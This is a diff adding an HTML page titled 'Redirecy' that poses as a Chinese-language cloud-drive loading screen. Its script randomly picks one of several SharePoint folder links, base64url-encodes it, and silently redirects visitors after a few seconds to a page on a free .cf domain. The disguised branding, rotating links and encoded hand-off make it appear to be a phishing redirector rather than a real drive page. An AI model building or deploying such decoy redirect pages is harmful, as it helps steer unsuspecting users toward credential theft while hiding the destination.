@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Redirecy</title>
+    <style>
+      @import url('https://fonts.googleapis.com/css2?family=Google+Sans&display=swap');
+    </style>
+  </head>
+  <style>
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+      font-family: 'Google Sans', sans-serif;
+    }
+    :root {
+      --bg-color: #15181e;
+      --font-base: aliceblue;
+      --code-base: fuchsia;
+      --callout: lime;
+      --pre-base: #303235;
+    }
+    html,
+    body {
+      font-family: 'Google Sans', sans-serif;
+      font-size: 16px;
+      background-color: var(--bg-color);
+      color: var(--font-base);
+    }
+
+    header {
+      font-family: 'Google Sans', sans-serif;
+    }
+
+    section {
+      font-family: 'Google Sans', sans-serif;
+      padding: 1.2em 0 0 0;
+    }
+
+    .logo {
+      font-family: 'Google Sans', sans-serif;
+      width: 100px;
+      height: 100px;
+    }
+
+    code {
+      font-family: 'Google Sans', sans-serif;
+      color: var(--code-base);
+    }
+
+    .callout {
+      font-family: 'Google Sans', sans-serif;
+      color: var(--callout);
+    }
+
+    pre {
+      font-family: 'Google Sans', sans-serif;
+      background-color: #15181e;
+      padding: 10px;
+      color: var(--code-base);
+    }
+    input {
+      font-family: 'Google Sans', sans-serif;
+      background-color: #26282e;
+      border: none;
+      color: white;
+      padding: 10px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      border-radius: 12px;
+    }
+
+    .button {
+      font-family: 'Google Sans', sans-serif;
+      background-color: #26282e;
+      border: none;
+      color: white;
+      padding: 10px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      border-radius: 12px;
+    }
+    .line-wobble {
+      --uib-size: 320px;
+      --uib-speed: 1.55s;
+      --uib-color: white;
+      --uib-line-weight: 5px;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: var(--uib-line-weight);
+      width: var(--uib-size);
+      border-radius: calc(var(--uib-line-weight) / 2);
+      overflow: hidden;
+      transform: translate3d(0, 0, 0);
+    }
+
+    .line-wobble::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      background-color: var(--uib-color);
+      opacity: 0.1;
+    }
+
+    .line-wobble::after {
+      content: '';
+      height: 100%;
+      width: 100%;
+      border-radius: calc(var(--uib-line-weight) / 2);
+      animation: wobble var(--uib-speed) ease-in-out infinite;
+      transform: translateX(-90%);
+      background-color: var(--uib-color);
+    }
+
+    @keyframes wobble {
+      0%,
+      100% {
+        transform: translateX(-90%);
+      }
+
+      50% {
+        transform: translateX(90%);
+      }
+    }
+  </style>
+  <body>
+    <header>
+
+      <div id="load">
+      <h1>雲端硬碟</h1>
+        <h2>載入中...</h2>
+        <div class="line-wobble"></div>
+      </div>
+    </header>
+    <article>
+      </div>
+      <script>
+      
+var links = [
+              "https://xd8j6.sharepoint.com/:f:/s/Cloud/EnXEPzxfHr1MoO9yXaEYCBMB-MFAoqr_1grldXUZ_h1jKw?e=gwUy09",
+              "https://xd8j6.sharepoint.com/:f:/s/Cloud/EnXEPzxfHr1MoO9yXaEYCBMB-MFAoqr_1grldXUZ_h1jKw?e=xFHLgpm",
+              "https://xd8j6.sharepoint.com/:f:/s/Cloud/EnXEPzxfHr1MoO9yXaEYCBMB-MFAoqr_1grldXUZ_h1jKw?e=IbLqfo",
+              "https://xd8j6.sharepoint.com/:f:/s/Cloud/EnXEPzxfHr1MoO9yXaEYCBMB-MFAoqr_1grldXUZ_h1jKw?e=jKDByI",
+            "https://xd8j6.sharepoint.com/:f:/s/Cloud/EnXEPzxfHr1MoO9yXaEYCBMB-MFAoqr_1grldXUZ_h1jKw?e=Tzbft7",
+          "https://xd8j6.sharepoint.com/:f:/s/Cloud/EnXEPzxfHr1MoO9yXaEYCBMB-MFAoqr_1grldXUZ_h1jKw?e=vNuauT",
+        "https://xd8j6.sharepoint.com/:f:/s/Cloud/EnXEPzxfHr1MoO9yXaEYCBMB-MFAoqr_1grldXUZ_h1jKw?e=3tD61m",
+      "https://xd8j6.sharepoint.com/:f:/s/Cloud/EnXEPzxfHr1MoO9yXaEYCBMB-MFAoqr_1grldXUZ_h1jKw?e=XlNbdC"]
+              // get a random number between 0 and the number of links
+              var randIdx = Math.random() * links.length;
+              // round it, so it can be used as array index
+              randIdx = parseInt(randIdx, 10);
+              // construct the link to be opened
+              var link = links[randIdx];
+              let base64 = btoa(link);
+              let base64url = base64
+                .replace(/\+/g, '-')
+                .replace(/\//g, '_')
+                .replace(/=+$/, '');
+              const urb =
+                'https://redirecy.codefoxy.cf/redb.html?bt=' + base64url;
+                setTimeout(function(){
+                  location = urb;
+},3750);
+      </script>
+    </article>
+  </body>
+</html>
